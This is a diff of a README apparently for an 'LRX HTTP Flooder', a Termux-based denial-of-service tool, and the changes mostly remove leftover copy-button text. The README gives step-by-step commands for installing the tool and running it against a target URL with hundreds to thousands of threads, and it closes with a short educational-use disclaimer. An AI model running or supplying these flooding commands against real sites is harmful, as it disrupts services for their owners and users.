@@ -11,27 +11,16 @@ Download and install Termux from F-Droid (recommended) or GitHub.
 
 🛠️ Step 2: Updating and Upgrading Termux
 Open Termux and update packages:
-
-bash
-Copy
-Edit
 pkg update && pkg upgrade -y
 This ensures that you have the latest versions of installed packages.
 
 🐍 Step 3: Installing Python and Pip
 Install Python and the pip package manager:
-
-bash
-Copy
-Edit
 pkg install python -y
 pip install --upgrade pip
+
 📂 Step 4: Cloning the LRX HTTP Flooder from GitHub
 Clone the repository using Git:
-
-bash
-Copy
-Edit
 pkg install git -y
 git clone https://github.com/YourUsername/LRX-HTTP-Flooder.git
 cd LRX-HTTP-Flooder
@@ -39,24 +28,14 @@ cd LRX-HTTP-Flooder
 
 🧰 Step 5: Installing Required Python Libraries
 Install necessary libraries using pip:
-
-bash
-Copy
-Edit
 pip install requests matplotlib
+
 🚀 Step 6: Running the LRX HTTP Flooder
 To start the attack, use the following command:
-
-bash
-Copy
-Edit
 python lrx_http_flooder.py --target https://example.com --duration 300 --threads 600
 Replace the target URL, duration, and number of threads as needed.
 
 💡 Example Usage
-bash
-Copy
-Edit
 python lrx_http_flooder.py --target https://example.com --duration 600 --threads 1000
 This will run the flooder against the specified target for 600 seconds with 1000 threads.
 
@@ -70,22 +49,14 @@ Real-time request logs
 To stop the attack, press:
 
 objectivec
-Copy
-Edit
 CTRL + C
 ✅ Troubleshooting
 If you encounter errors related to Python libraries, reinstall them:
-
-bash
-Copy
-Edit
 pip install --force-reinstall requests matplotlib
-If the script doesn’t execute, make sure it has executable permissions:
 
-bash
-Copy
-Edit
+If the script doesn’t execute, make sure it has executable permissions:
 chmod +x lrx_http_flooder.py
+
 ⚠️ Disclaimer
 This tool is intended for educational and testing purposes only. Unauthorized use of this tool on third-party systems is illegal and punishable by law. Use responsibly and only on systems you own or have permission to test.
 
